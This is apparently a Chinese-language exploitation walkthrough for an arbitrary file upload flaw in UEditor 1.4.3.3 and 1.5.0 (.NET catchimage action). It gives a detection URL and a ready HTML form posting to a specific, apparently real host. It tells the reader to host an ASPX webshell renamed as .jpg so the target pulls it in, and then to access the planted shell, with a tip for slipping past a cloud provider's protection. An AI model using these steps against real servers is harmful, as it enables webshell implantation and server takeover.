## ueditor两个版本的文件任意上传

影响版本 ueditor 1.4.3.3 和 1.5.0   

### 1. 存在判断

直接访问：http://iP:port//Scripts/plugins/ueditor/net/controller.ashx?action=catchimage  

如果响应为无法获取参数，则意味着存在漏洞，可以继续渗透利用。   

### 2. 漏洞利用
基于上述的存在漏洞，通过如下步骤进行利用：   
1. 本地编写HTML，用于提交请求： shell.html   

`<html>`
`<head>`
`<meta charset="UTF-8">`
`<title>ueditor 1.4.3.3 file upload vul</title>`
`<head>`
`<body>`
`<form action="http://agns.vivo.xyz:9002/Scripts/plugins/ueditor/net/controller.ashx?action=catchimage" enctype="application/x-www-form-urlencoded"  method="POST">`
`<p>shell addr:<input type="text" name="source[]" /></p>`
`<input type="submit" value="Submit" />`
`</form>`
`</body>`
`</html>`
	

 
2. 构造图片木马，可以直接将ASPX shell命名为.jpg，并将其放在远程服务器上: http://IP:port/shell/spy.jpg?.aspx（阿里云存在防护，webshell无法被访问到，可利用普通的aspx进行替换）    
4. 根据响应，确认文件上传的目录，进行访问即可  


